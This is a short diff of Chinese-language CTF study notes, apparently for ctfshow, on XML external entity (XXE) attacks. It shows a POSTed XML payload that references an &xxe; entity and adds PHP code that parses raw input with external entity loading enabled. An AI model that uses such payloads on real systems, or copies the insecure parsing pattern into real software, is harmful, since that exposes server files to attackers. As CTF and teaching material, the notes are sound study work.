@@ -379,7 +379,6 @@ if(isset($xmlfile)){
 }
 
 [POST]Payload:
-
 <?xml version="1.0"?>
 <!DOCTYPE payload [
 <!ELEMENT payload ANY>
@@ -388,6 +387,15 @@ if(isset($xmlfile)){
 <creds>
 <ctfshow>&xxe;</ctfshow>
 </creds>
+
+
+类似的
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
 ```
 
 ## **引发信息泄露的危险函数**
